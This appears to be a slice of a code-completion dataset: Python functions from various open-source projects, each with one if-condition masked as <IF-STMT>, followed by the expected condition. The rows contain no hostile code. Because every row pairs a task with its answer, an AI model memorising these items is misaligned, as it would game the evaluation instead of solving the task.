3049,"def migrate_replay_storage(apps, schema_editor):<tab>model = apps.get_model(""terminal"", ""ReplayStorage"")<tab>init_storage_data(model)<tab>setting = get_setting(apps, schema_editor, ""TERMINAL_REPLAY_STORAGE"")<tab>if not setting:<tab><tab>return<tab>values = get_storage_data(setting)<tab>for name, meta in values.items():<tab><tab>tp = meta.pop(""TYPE"", None)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>model.objects.create(name=name, type=tp, meta=meta)","if not tp or name in [ ""default"" , ""null"" ] :",150
3050,"def load_distribution(args: CommandLineArguments) -> CommandLineArguments:<tab>if args.distribution is not None:<tab><tab>args.distribution = Distribution[args.distribution]<tab>if args.distribution is None or args.release is None:<tab><tab>d, r = detect_distribution()<tab><tab>if args.distribution is None:<tab><tab><tab>args.distribution = d<tab><tab><IF-STMT><tab><tab><tab>args.release = r<tab>if args.distribution is None:<tab><tab>die(""Couldn't detect distribution."")<tab>return args",if args . distribution == d and d != Distribution . clear and args . release is None :,137
3051,"def fieldset_string_to_field(fieldset_dict, model):<tab>if isinstance(fieldset_dict[""fields""], tuple):<tab><tab>fieldset_dict[""fields""] = list(fieldset_dict[""fields""])<tab>i = 0<tab>for dict_field in fieldset_dict[""fields""]:<tab><tab>if isinstance(dict_field, string_types):<tab><tab><tab>fieldset_dict[""fields""][i] = model._meta.get_field_by_name(dict_field)[0]<tab><tab><IF-STMT><tab><tab><tab>dict_field[1][""recursive""] = True<tab><tab><tab>fieldset_string_to_field(dict_field[1], model)<tab><tab>i += 1","elif isinstance ( dict_field , list ) or isinstance ( dict_field , tuple ) :",179
3052,"def icon(display_icon):<tab>""""""returns empty dict if show_icons is False, else the icon passed""""""<tab>kws = {}<tab>if get_icon_switch():<tab><tab>if display_icon.startswith(""SV_""):<tab><tab><tab>kws = {""icon_value"": custom_icon(display_icon)}<tab><tab><IF-STMT><tab><tab><tab>kws = {""icon"": display_icon}<tab>return kws","elif display_icon != ""OUTLINER_OB_EMPTY"" :",106
3053,"def cancel_helper(self, node, to_cancel):<tab>children = set(self.workflow.successors(node))<tab>for child in children:<tab><tab><IF-STMT><tab><tab><tab>to_cancel.append(child.id_)<tab><tab><tab>self.cancelled.append(node.id_)<tab><tab><tab>await self.cancel_helper(child, to_cancel)<tab>return to_cancel",if self . parent_map [ child . id_ ] == 1 :,103
3054,"def getStatusString(self):<tab>if not self._isAvailable:<tab><tab>return ""Doodle3D box not found""<tab>if self._printing:<tab><tab>if self._blockIndex < len(self._fileBlocks):<tab><tab><tab>ret = ""Sending GCode: %.1f%%"" % (<tab><tab><tab><tab>float(self._blockIndex) * 100.0 / float(len(self._fileBlocks))<tab><tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>ret = ""Finished sending GCode to Doodle3D box.""<tab><tab>else:<tab><tab><tab>ret = ""Different print still running...""<tab><tab># ret += ""\nErrorCount: %d"" % (self._errorCount)<tab><tab>return ret<tab>return ""Printer found, waiting for print command.""",elif len ( self . _fileBlocks ) > 0 :,190
3055,"def test_archive_files_message(self):<tab>filelist = [""test.torrent"", ""deluge.png""]<tab>arc_filepath = archive_files(<tab><tab>""test-arc"", [get_test_data_file(f) for f in filelist], message=""test""<tab>)<tab>result_files = filelist + [""archive_message.txt""]<tab>with tarfile.open(arc_filepath, ""r"") as tar:<tab><tab>self.assertEqual(tar.getnames(), result_files)<tab><tab>for tar_info in tar:<tab><tab><tab>self.assertTrue(tar_info.isfile())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = tar.extractfile(tar_info).read().decode()<tab><tab><tab><tab>self.assertEqual(result, ""test"")","if tar_info . name == ""archive_message.txt"" :",191
3056,"def _format_arg(self, opt, spec, val):<tab>if opt in [""in_files""]:<tab><tab>return scans_for_fnames(ensure_list(val))<tab>if opt == ""fwhm"":<tab><tab>if not isinstance(val, list):<tab><tab><tab>return [val, val, val]<tab><tab><IF-STMT><tab><tab><tab>if len(val) == 1:<tab><tab><tab><tab>return [val[0], val[0], val[0]]<tab><tab><tab>else:<tab><tab><tab><tab>return val<tab>return super(Smooth, self)._format_arg(opt, spec, val)","if isinstance ( val , list ) :",148
3057,"def fuzzy_sum(self, currency, rounding=ROUND_UP):<tab>a = Money.ZEROS[currency].amount<tab>fuzzy = False<tab>for m in self:<tab><tab><IF-STMT><tab><tab><tab>a += m.amount<tab><tab>elif m.amount:<tab><tab><tab>a += m.convert(currency, rounding=None).amount<tab><tab><tab>fuzzy = True<tab>r = Money(a, currency, rounding=rounding)<tab>r.fuzzy = fuzzy<tab>return r",if m . currency == currency :,122
3058,"def _read_potfiles(src_root, potfiles):<tab>""""""Returns a list of paths for a POTFILES.in file""""""<tab>paths = []<tab>with open(potfiles, ""r"", encoding=""utf-8"") as h:<tab><tab>for line in h:<tab><tab><tab>line = line.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>paths.append(os.path.normpath(os.path.join(src_root, line)))<tab>return paths","if not line or line . startswith ( ""#"" ) :",123
3059,"def applyMath(self, val, math, frmt):<tab># apply math function - eval<tab>try:<tab><tab>x = eval(val)<tab><tab><IF-STMT><tab><tab><tab>x = eval(math)<tab><tab>val = (""{0"" + frmt + ""}"").format(x)<tab>except:<tab><tab>dprint(<tab><tab><tab>__name__,<tab><tab><tab>0,<tab><tab><tab>""CCmds_applyMath: Error in math {0}, frmt {1}\n{2}"",<tab><tab><tab>math,<tab><tab><tab>frmt,<tab><tab><tab>traceback.format_exc(),<tab><tab>)<tab># apply format specifier<tab>dprint(__name__, 2, ""CCmds_applyMath: {0}"", val)<tab>return val","if math != """" :",179
3060,def run_train_loop(self):<tab>self.begin_training()<tab>for _ in self.yield_train_step():<tab><tab><IF-STMT><tab><tab><tab>self.save_model()<tab><tab>if self.should_save_checkpoint():<tab><tab><tab>self.save_checkpoint()<tab><tab>if self.should_eval_model():<tab><tab><tab>self.eval_model()<tab><tab>if self.should_break_training():<tab><tab><tab>break<tab>self.eval_model()<tab>self.done_training()<tab>return self.returned_result(),if self . should_save_model ( ) :,139
3061,"def node_exists(self, jid=None, node=None, ifrom=None):<tab>with self.lock:<tab><tab>if jid is None:<tab><tab><tab>jid = self.xmpp.boundjid.full<tab><tab><IF-STMT><tab><tab><tab>node = """"<tab><tab>if ifrom is None:<tab><tab><tab>ifrom = """"<tab><tab>if isinstance(ifrom, JID):<tab><tab><tab>ifrom = ifrom.full<tab><tab>if (jid, node, ifrom) not in self.nodes:<tab><tab><tab>return False<tab><tab>return True",if node is None :,136
3062,"def _collect(self, writer=None):<tab>for artifact_name in self.plugin_args.artifacts:<tab><tab>for hit in self.collect_artifact(artifact_name):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>writer.write_result(hit[""result""])<tab><tab><tab>yield hit","if ""result"" in hit and writer :",76
3063,"def proc(qtbot, caplog):<tab>""""""A fixture providing a GUIProcess and cleaning it up after the test.""""""<tab>p = guiprocess.GUIProcess(""testprocess"")<tab>yield p<tab>if p._proc.state() == QProcess.Running:<tab><tab>with caplog.at_level(logging.ERROR):<tab><tab><tab>with qtbot.waitSignal(p.finished, timeout=10000, raising=False) as blocker:<tab><tab><tab><tab>p._proc.terminate()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>p._proc.kill()<tab><tab><tab>p._proc.waitForFinished()",if not blocker . signal_triggered :,148
3064,"def getsequences(self):<tab>""""""Return the set of sequences for the folder.""""""<tab>sequences = {}<tab>fullname = self.getsequencesfilename()<tab>try:<tab><tab>f = open(fullname, ""r"")<tab>except IOError:<tab><tab>return sequences<tab>while 1:<tab><tab>line = f.readline()<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>fields = line.split("":"")<tab><tab>if len(fields) != 2:<tab><tab><tab>self.error(""bad sequence in %s: %s"" % (fullname, line.strip()))<tab><tab>key = fields[0].strip()<tab><tab>value = IntSet(fields[1].strip(), "" "").tolist()<tab><tab>sequences[key] = value<tab>return sequences",if not line :,173
3065,def get_coeffs(e):<tab>coeffs = []<tab>for du in all_delu_dict.keys():<tab><tab><IF-STMT><tab><tab><tab>coeffs.append(self.as_coeffs_dict[e])<tab><tab>elif du in self.as_coeffs_dict[e].keys():<tab><tab><tab>coeffs.append(self.as_coeffs_dict[e][du])<tab><tab>else:<tab><tab><tab>coeffs.append(0)<tab>return np.array(coeffs),"if type ( self . as_coeffs_dict [ e ] ) . __name__ == ""float"" :",132
3066,"def block_items(objekt, block, eldict):<tab>if objekt not in block:<tab><tab>if isinstance(objekt.type, PyType):<tab><tab><tab>if objekt.type not in block:<tab><tab><tab><tab>block.append(objekt.type)<tab><tab>block.append(objekt)<tab><tab>if isinstance(objekt, PyType):<tab><tab><tab>others = [<tab><tab><tab><tab>p<tab><tab><tab><tab>for p in eldict.values()<tab><tab><tab><tab>if isinstance(p, PyElement) and p.type[1] == objekt.name<tab><tab><tab>]<tab><tab><tab>for item in others:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>block.append(item)<tab>return block",if item not in block :,186
3067,"def FindPrefix(self, prefix):<tab>self.log.WriteText(""Looking for prefix: %s\n"" % prefix)<tab>if prefix:<tab><tab>prefix = prefix.lower()<tab><tab>length = len(prefix)<tab><tab># Changed in 2.5 because ListBox.Number() is no longer supported.<tab><tab># ListBox.GetCount() is now the appropriate way to go.<tab><tab>for x in range(self.GetCount()):<tab><tab><tab>text = self.GetString(x)<tab><tab><tab>text = text.lower()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.log.WriteText(""Prefix %s is found.\n"" % prefix)<tab><tab><tab><tab>return x<tab>self.log.WriteText(""Prefix %s is not found.\n"" % prefix)<tab>return -1",if text [ : length ] == prefix :,195
3068,"def encode(self, input, errors=""strict""):<tab>if self.encoder is None:<tab><tab>result = codecs.utf_32_encode(input, errors)<tab><tab><IF-STMT><tab><tab><tab>self.encoder = codecs.utf_32_le_encode<tab><tab>else:<tab><tab><tab>self.encoder = codecs.utf_32_be_encode<tab><tab>return result<tab>else:<tab><tab>return self.encoder(input, errors)","if sys . byteorder == ""little"" :",109
3069,"def __call__(self, message, keyname):<tab>if keyname in self.keyring:<tab><tab>key = self.keyring[keyname]<tab><tab><IF-STMT><tab><tab><tab>if message:<tab><tab><tab><tab>GSSTSigAdapter.parse_tkey_and_step(key, message, keyname)<tab><tab>return key<tab>else:<tab><tab>return None","if isinstance ( key , Key ) and key . algorithm == GSS_TSIG :",98
3070,"def unicode_metrics(metrics):<tab>for i, metric in enumerate(metrics):<tab><tab>for key, value in metric.items():<tab><tab><tab>if isinstance(value, basestring):<tab><tab><tab><tab>metric[key] = unicode(value, errors=""replace"")<tab><tab><tab>elif isinstance(value, tuple) or isinstance(value, list):<tab><tab><tab><tab>value_list = list(value)<tab><tab><tab><tab>for j, value_element in enumerate(value_list):<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>value_list[j] = unicode(value_element, errors=""replace"")<tab><tab><tab><tab>metric[key] = tuple(value_list)<tab><tab>metrics[i] = metric<tab>return metrics","if isinstance ( value_element , basestring ) :",177
3071,"def step(self, action):<tab>assert self.action_space.contains(action)<tab>if self._state == 4:<tab><tab>if action and self._case:<tab><tab><tab>return self._state, 10.0, True, {}<tab><tab>else:<tab><tab><tab>return self._state, -10, True, {}<tab>else:<tab><tab>if action:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self._state = 2<tab><tab><tab>else:<tab><tab><tab><tab>self._state += 1<tab><tab>elif self._state == 2:<tab><tab><tab>self._state = self._case<tab>return self._state, -1, False, {}",if self . _state == 0 :,157
3072,"def get_superuser(self):<tab>try:<tab><tab>query = dict()<tab><tab><IF-STMT><tab><tab><tab>query[get_user_model().USERNAME_FIELD] = ""admin""<tab><tab>else:<tab><tab><tab>query[get_user_model().USERNAME_FIELD] = ""admin@django-cms.org""<tab><tab>admin = get_user_model().objects.get(**query)<tab>except get_user_model().DoesNotExist:<tab><tab>admin = self._create_user(""admin"", is_staff=True, is_superuser=True)<tab>return admin","if get_user_model ( ) . USERNAME_FIELD != ""email"" :",145
3073,"def newend(self):<tab>newenddatetime = self._newenddate<tab>if not self.checkallday.state:<tab><tab><IF-STMT><tab><tab><tab>tzinfo = self.conf.default.default_timezone<tab><tab>else:<tab><tab><tab>tzinfo = self.enddt.tzinfo<tab><tab>try:<tab><tab><tab>newendtime = self._newendtime<tab><tab><tab>newenddatetime = datetime.combine(newenddatetime, newendtime)<tab><tab><tab>newenddatetime = tzinfo.localize(newenddatetime)<tab><tab>except TypeError:<tab><tab><tab>return None<tab>return newenddatetime","if not hasattr ( self . enddt , ""tzinfo"" ) or self . enddt . tzinfo is None :",159
3074,"def run(self):<tab>to_delete = set()<tab>for k, v in iteritems(self.objs):<tab><tab>if k.startswith(""_""):<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>to_delete.add(k)<tab><tab>if v[""_class""] == ""Task"":<tab><tab><tab>v[""submission_format""] = list(<tab><tab><tab><tab>self.objs[k][""filename""] for k in v.get(""submission_format"", list())<tab><tab><tab>)<tab>for k in to_delete:<tab><tab>del self.objs[k]<tab>return self.objs","if v [ ""_class"" ] == ""SubmissionFormatElement"" :",147
3075,"def update_reserved_qty_for_subcontract(self):<tab>for d in self.supplied_items:<tab><tab><IF-STMT><tab><tab><tab>stock_bin = get_bin(d.rm_item_code, d.reserve_warehouse)<tab><tab><tab>stock_bin.update_reserved_qty_for_sub_contracting()",if d . rm_item_code :,86
3076,"def process(self):<tab>if ""Length"" in self.outputs and self.outputs[""Length""].is_linked:<tab><tab>if ""Data"" in self.inputs and self.inputs[""Data""].is_linked:<tab><tab><tab>data = self.inputs[""Data""].sv_get(deepcopy=False)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>out = [[len(data)]]<tab><tab><tab>elif self.level == 1:<tab><tab><tab><tab>out = [self.count(data, self.level)]<tab><tab><tab>else:<tab><tab><tab><tab>out = self.count(data, self.level)<tab><tab><tab>self.outputs[""Length""].sv_set(out)",if not self . level :,159
3077,"def _user_has_perm(user, perm, obj):<tab>anon = user.is_anonymous()<tab>for backend in auth.get_backends():<tab><tab><IF-STMT><tab><tab><tab>if hasattr(backend, ""has_perm""):<tab><tab><tab><tab>if obj is not None:<tab><tab><tab><tab><tab>if backend.supports_object_permissions and backend.has_perm(<tab><tab><tab><tab><tab><tab>user, perm, obj<tab><tab><tab><tab><tab>):<tab><tab><tab><tab><tab><tab>return True<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>if backend.has_perm(user, perm):<tab><tab><tab><tab><tab><tab>return True<tab>return False",if not anon or backend . supports_anonymous_user :,163
3078,"def visit(self, node=None):<tab>""""""Walks over a node.  If no node is provided, the tree is used.""""""<tab>if node is None:<tab><tab>node = self.tree<tab>if node is None:<tab><tab>raise RuntimeError(""no node or tree given!"")<tab>for clsname in map(_lowername, type.mro(node.__class__)):<tab><tab>meth = getattr(self, ""visit_"" + clsname, None)<tab><tab><IF-STMT><tab><tab><tab>rtn = meth(node)<tab><tab><tab>break<tab>else:<tab><tab>msg = ""could not find valid visitor method for {0} on {1}""<tab><tab>nodename = node.__class__.__name__<tab><tab>selfname = self.__class__.__name__<tab><tab>raise AttributeError(msg.format(nodename, selfname))<tab>return rtn",if callable ( meth ) :,194
3079,"def add_fade_out(compositor, fade_out_length):<tab>clip = _get_compositor_clip(compositor)<tab>keyframe_property, property_klass, keyframes = _get_kfproperty_klass_and_keyframes(<tab><tab>compositor, clip<tab>)<tab>if fade_out_length > 0:<tab><tab><IF-STMT><tab><tab><tab>return _do_user_add_fade_out(<tab><tab><tab><tab>keyframe_property, property_klass, keyframes, fade_out_length, clip<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>_show_length_error_dialog()<tab><tab><tab>return None",if fade_out_length + 1 <= clip . clip_length ( ) :,167
3080,"def make_timesheet_records():<tab>employees = get_timesheet_based_salary_slip_employee()<tab>for e in employees:<tab><tab>ts = make_timesheet(<tab><tab><tab>e.employee,<tab><tab><tab>simulate=True,<tab><tab><tab>billable=1,<tab><tab><tab>activity_type=get_random(""Activity Type""),<tab><tab><tab>company=frappe.flags.company,<tab><tab>)<tab><tab>frappe.db.commit()<tab><tab>rand = random.random()<tab><tab>if rand >= 0.3:<tab><tab><tab>make_salary_slip_for_timesheet(ts.name)<tab><tab>rand = random.random()<tab><tab><IF-STMT><tab><tab><tab>make_sales_invoice_for_timesheet(ts.name)",if rand >= 0.2 :,197
3081,"def _target_from_batch(self, batch):<tab>targets = []<tab>for name in self.labels:<tab><tab>target = getattr(batch, name)<tab><tab><IF-STMT><tab><tab><tab>label_vocab = self.metadata.target.vocab.stoi<tab><tab><tab>batch_label_list = getattr(batch, Target.TARGET_LABEL_FIELD)<tab><tab><tab>target = align_target_labels(target, batch_label_list, label_vocab)<tab><tab>targets.append(target)<tab>if len(targets) == 1:<tab><tab>return targets[0]<tab>return tuple(targets)","if name in [ Target . TARGET_PROB_FIELD , Target . TARGET_LOGITS_FIELD ] :",161
3082,"def detectForms(html):<tab>erreur = """"<tab>soup = BeautifulSoup(html, ""html.parser"")<tab>detectedForms = soup.find_all(""form"")<tab>returnForms = []<tab>if len(detectedForms) > 0:<tab><tab>for f in detectedForms:<tab><tab><tab>fileInputs = f.findChildren(""input"", {""type"": re.compile(""file"", re.I)})<tab><tab><tab><IF-STMT><tab><tab><tab><tab>returnForms.append((f, fileInputs))<tab>return returnForms",if len ( fileInputs ) > 0 :,136
3083,"def _updateNewCardRatio(self):<tab>if self.col.conf[""newSpread""] == NEW_CARDS_DISTRIBUTE:<tab><tab><IF-STMT><tab><tab><tab>self.newCardModulus = (self.newCount + self.revCount) // self.newCount<tab><tab><tab># if there are cards to review, ensure modulo >= 2<tab><tab><tab>if self.revCount:<tab><tab><tab><tab>self.newCardModulus = max(2, self.newCardModulus)<tab><tab><tab>return<tab>self.newCardModulus = 0",if self . newCount :,128
3084,"def __prep_write_total(self, comments, main, fallback, single):<tab>lower = self.as_lowercased()<tab>for k in [main, fallback, single]:<tab><tab><IF-STMT><tab><tab><tab>del comments[k]<tab>if single in lower:<tab><tab>parts = lower[single].split(""/"", 1)<tab><tab>if parts[0]:<tab><tab><tab>comments[single] = [parts[0]]<tab><tab>if len(parts) > 1:<tab><tab><tab>comments[main] = [parts[1]]<tab>if main in lower:<tab><tab>comments[main] = lower.list(main)<tab>if fallback in lower:<tab><tab>if main in comments:<tab><tab><tab>comments[fallback] = lower.list(fallback)<tab><tab>else:<tab><tab><tab>comments[main] = lower.list(fallback)",if k in comments :,196
3085,"def check_physical(self, line):<tab>""""""Run all physical checks on a raw input line.""""""<tab>self.physical_line = line<tab>for name, check, argument_names in self._physical_checks:<tab><tab>self.init_checker_state(name, argument_names)<tab><tab>result = self.run_check(check, argument_names)<tab><tab>if result is not None:<tab><tab><tab>(offset, text) = result<tab><tab><tab>self.report_error(self.line_number, offset, text, check)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>self.indent_char = line[0]","if text [ : 4 ] == ""E101"" :",154
3086,"def dependencies(self):<tab>deps = []<tab>midx = None<tab>if self.ref is not None:<tab><tab>query = GroupQuery(self.ref)<tab><tab>g = query.execute(self.schema)<tab><tab><IF-STMT><tab><tab><tab>log.debug(self.schema)<tab><tab><tab>raise TypeNotFound(self.ref)<tab><tab>deps.append(g)<tab><tab>midx = 0<tab>return (midx, deps)",if g is None :,109
3087,"def __init__(self, metadata=None):<tab><IF-STMT><tab><tab>db = get_session()<tab><tab>metadata = lookup_feed(db, self.__feed_name__)<tab><tab>if not metadata:<tab><tab><tab>raise Exception(<tab><tab><tab><tab>""Must have feed metadata in db already, should sync metadata before invoking instance operations""<tab><tab><tab>)<tab>super(AnchoreServiceFeed, self).__init__(metadata=metadata)",if not metadata :,102
3088,"def testGetPartRect(self):<tab>""Make sure the part rectangles are retrieved correctly""<tab>for i in range(0, self.ctrl.part_count()):<tab><tab>part_rect = self.ctrl.get_part_rect(i)<tab><tab>self.assertEqual(part_rect.left, self.part_rects[i].left)<tab><tab><IF-STMT><tab><tab><tab>self.assertEqual(part_rect.right, self.part_rects[i].right)<tab><tab>self.assertEqual(part_rect.top, self.part_rects[i].top)<tab><tab>self.assertFalse(abs(part_rect.bottom - self.part_rects[i].bottom) > 2)<tab>self.assertRaises(IndexError, self.ctrl.get_part_rect, 99)",if i != self . ctrl . part_count ( ) - 1 :,197
3089,"def __call__(self, ctx):<tab>if ctx.range and ctx.value:<tab><tab>if self.raw:<tab><tab><tab>ctx.range.raw_value = ctx.value<tab><tab><tab>return<tab><tab>scalar = ctx.meta.get(""scalar"", False)<tab><tab><IF-STMT><tab><tab><tab>ctx.range = ctx.range.resize(len(ctx.value), len(ctx.value[0]))<tab><tab>self._write_value(ctx.range, ctx.value, scalar)",if not scalar :,117
3090,"def basic_get(self, queue, no_ack=False, **kwargs):<tab>""""""Get message by direct access (synchronous).""""""<tab>try:<tab><tab>message = self.Message(self._get(queue), channel=self)<tab><tab><IF-STMT><tab><tab><tab>self.qos.append(message, message.delivery_tag)<tab><tab>return message<tab>except Empty:<tab><tab>pass",if not no_ack :,97
3091,"def http_client(cls) -> aiohttp.ClientSession:<tab>if cls._client is None:<tab><tab><IF-STMT><tab><tab><tab>raise EnvironmentError(<tab><tab><tab><tab>""Event loop must be running to start HTTP client session.""<tab><tab><tab>)<tab><tab>cls._client = aiohttp.ClientSession(request_class=SSLClientRequest)<tab>return cls._client",if not asyncio . get_event_loop ( ) . is_running ( ) :,97
3092,"def createMimeType(self):<tab>audio = False<tab>for prop in self.array(""header/content/stream_prop""):<tab><tab>guid = prop[""content/type""].value<tab><tab>if guid == VideoHeader.guid:<tab><tab><tab>return u""video/x-ms-wmv""<tab><tab><IF-STMT><tab><tab><tab>audio = True<tab>if audio:<tab><tab>return u""audio/x-ms-wma""<tab>else:<tab><tab>return u""video/x-ms-asf""",if guid == AudioHeader . guid :,126
3093,"def _removeCachedRFInfo(self, cache_key, path, removeChildPaths):<tab>log.debug(""_removeCachedRFInfo: cache_key %r, path %r"", cache_key, path)<tab>if self._cachedFiles.has_key(cache_key):<tab><tab>cache = self._cachedFiles[cache_key]<tab><tab>if cache.has_key(path):<tab><tab><tab>del cache[path]<tab><tab>if removeChildPaths:<tab><tab><tab># Remove all cached paths that are under this directory<tab><tab><tab>from remotefilelib import addslash<tab><tab><tab>dirPath = addslash(path)<tab><tab><tab>for keypath in cache.keys():<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>del cache[keypath]",if keypath . startswith ( dirPath ) :,178
3094,"def format(self, obj, context, maxlevels, level):<tab>if isinstance(obj, unicode):<tab><tab># return (obj.encode('utf8'), True, False)<tab><tab>return (obj, True, False)<tab>if isinstance(obj, bytes):<tab><tab>convert = False<tab><tab># for c in obj:<tab><tab># 	if ord(c) >= 128:<tab><tab># 		convert = True<tab><tab># 		break<tab><tab>try:<tab><tab><tab>codecs.decode(obj)<tab><tab>except:<tab><tab><tab>convert = True<tab><tab><IF-STMT><tab><tab><tab>return (""0x{}"".format(obj), True, False)<tab>return pprint.PrettyPrinter.format(self, obj, context, maxlevels, level)",if convert :,176
3095,"def add_data_source(self, f=None, s_name=None, source=None, module=None, section=None):<tab>try:<tab><tab>if module is None:<tab><tab><tab>module = self.name<tab><tab>if section is None:<tab><tab><tab>section = ""all_sections""<tab><tab>if s_name is None:<tab><tab><tab>s_name = f[""s_name""]<tab><tab><IF-STMT><tab><tab><tab>source = os.path.abspath(os.path.join(f[""root""], f[""fn""]))<tab><tab>report.data_sources[module][section][s_name] = source<tab>except AttributeError:<tab><tab>logger.warning(<tab><tab><tab>""Tried to add data source for {}, but was missing fields data"".format(<tab><tab><tab><tab>self.name<tab><tab><tab>)<tab><tab>)",if source is None :,198
3096,"def open(self, *args, **kwargs):<tab>if kwargs.get(""json"") is not None:<tab><tab>with self.session_transaction() as sess:<tab><tab><tab>api_key_headers = Headers({""CSRF-Token"": sess.get(""nonce"")})<tab><tab><tab>headers = kwargs.pop(""headers"", Headers())<tab><tab><tab><IF-STMT><tab><tab><tab><tab>headers = Headers(headers)<tab><tab><tab>headers.extend(api_key_headers)<tab><tab><tab>kwargs[""headers""] = headers<tab>return super(CTFdTestClient, self).open(*args, **kwargs)","if isinstance ( headers , dict ) :",141
3097,"def get_params(self):<tab>if not hasattr(self, ""input_space""):<tab><tab>raise AttributeError(""Input space has not been provided."")<tab>rval = []<tab>for layer in self.layers:<tab><tab>for param in layer.get_params():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>logger.info(type(layer))<tab><tab>layer_params = layer.get_params()<tab><tab>assert not isinstance(layer_params, set)<tab><tab>for param in layer_params:<tab><tab><tab>if param not in rval:<tab><tab><tab><tab>rval.append(param)<tab>rval = [elem for elem in rval if elem not in self.freeze_set]<tab>assert all([elem.name is not None for elem in rval])<tab>return rval",if param . name is None :,181
3098,"def _animate_strategy(self, speed=1):<tab>if self._animating == 0:<tab><tab>return<tab>if self._apply_strategy() is not None:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>if self._animate.get() == 1:<tab><tab><tab>self._root.after(3000, self._animate_strategy)<tab><tab>elif self._animate.get() == 2:<tab><tab><tab>self._root.after(1000, self._animate_strategy)<tab><tab>else:<tab><tab><tab>self._root.after(20, self._animate_strategy)",if self . _animate . get ( ) == 0 or self . _step . get ( ) == 1 :,151
3099,"def charAt(pos):<tab>this.cok()<tab>pos = pos.to_int()<tab>s = this.to_string()<tab>if 0 <= pos < len(s.value):<tab><tab>char = s.value[pos]<tab><tab><IF-STMT><tab><tab><tab>s.Js(char)  # add char to char bank<tab><tab>return s.CHAR_BANK[char]<tab>return s.CHAR_BANK[""""]",if char not in s . CHAR_BANK :,116
3100,"def find_executable(names):<tab># Given a list of executable names, find the first one that is available<tab># as an executable file, on the path.<tab>for name in names:<tab><tab>fpath, fname = os.path.split(name)<tab><tab>if fpath:<tab><tab><tab># The given name is absolute.<tab><tab><tab>if is_executable(name):<tab><tab><tab><tab>return name<tab><tab>else:<tab><tab><tab># Try to find the name on the PATH<tab><tab><tab>for path in os.environ[""PATH""].split(os.pathsep):<tab><tab><tab><tab>exe_file = os.path.join(path, name)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>return exe_file<tab># Could not find it :(<tab>return None",if is_executable ( exe_file ) :,186
3101,"def match_file(self, file, tff_format):<tab>match = tff_format.search(file.filename.replace(""\\"", ""/""))<tab>if match:<tab><tab>result = {}<tab><tab>for name, value in match.groupdict().items():<tab><tab><tab>value = value.strip()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = value.lstrip(""0"")<tab><tab><tab>if self.ui.replace_underscores.isChecked():<tab><tab><tab><tab>value = value.replace(""_"", "" "")<tab><tab><tab>result[name] = value<tab><tab>return result<tab>else:<tab><tab>return {}",if name in self . numeric_tags :,149
3102,"def __init__(<tab>self,<tab>filename: str = ""checkpoint"",<tab>frequency: Union[int, List[int]] = 1,<tab>on: Union[str, List[str]] = ""epoch_end"",):<tab>if isinstance(frequency, list):<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""If you pass a list for checkpoint frequencies, the `on` ""<tab><tab><tab><tab>""parameter has to be a list with the same length.""<tab><tab><tab>)<tab>self._frequency = frequency<tab>super(_TuneCheckpointCallback, self).__init__(on)<tab>self._filename = filename<tab>self._counter = Counter()<tab>self._cp_count = 0  # Has to be monotonically increasing","if not isinstance ( on , list ) or len ( frequency ) != len ( on ) :",185
3103,"def download(cls, architecture, path=""./""):<tab>if cls.sanity_check(architecture):<tab><tab>architecture_file = path + ""imagenet_{}.pth"".format(architecture)<tab><tab>if not os.path.exists(architecture_file):<tab><tab><tab>kwargs = {}<tab><tab><tab><IF-STMT><tab><tab><tab><tab>kwargs[""transform_input""] = False<tab><tab><tab>model = models.__dict__[architecture](pretrained=True, **kwargs)<tab><tab><tab>torch.save(model, architecture_file)<tab><tab><tab>print(<tab><tab><tab><tab>""PyTorch pretrained model is saved as [{}]."".format(architecture_file)<tab><tab><tab>)<tab><tab>else:<tab><tab><tab>print(""File [{}] existed!"".format(architecture_file))<tab><tab>return architecture_file<tab>else:<tab><tab>return None","if architecture == ""inception_v3"" :",198
3104,"def __exit__(self, exc_type, exc_value, traceback):<tab>self.signal.disconnect(self._listener)<tab>if not self.signal_sent:<tab><tab>self.test_case.fail(""Signal was not sent."")<tab><tab>return<tab>if self.required_kwargs is not None:<tab><tab>missing_kwargs = []<tab><tab>for k in self.required_kwargs:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>missing_kwargs.append(k)<tab><tab>if missing_kwargs:<tab><tab><tab>self.test_case.fail(<tab><tab><tab><tab>""Signal missing required arguments: "" ""%s"" % "","".join(missing_kwargs)<tab><tab><tab>)",if k not in self . received_kwargs :,166
3105,"def Assign(left, right):<tab>names = []<tab>if isinstance(left, ast.Name):<tab><tab># Single assignment on left<tab><tab>return ast.Assign([ast.AssName(left.name, ""OP_ASSIGN"")], right)<tab>elif isinstance(left, ast.Tuple):<tab><tab># List of things - make sure they are Name nodes<tab><tab>names = []<tab><tab>for child in left.getChildren():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise SyntaxError(""that assignment not supported"")<tab><tab><tab>names.append(child.name)<tab><tab>ass_list = [ast.AssName(name, ""OP_ASSIGN"") for name in names]<tab><tab>return ast.Assign([ast.AssTuple(ass_list)], right)<tab>else:<tab><tab>raise SyntaxError(""Can't do that yet"")","if not isinstance ( child , ast . Name ) :",197
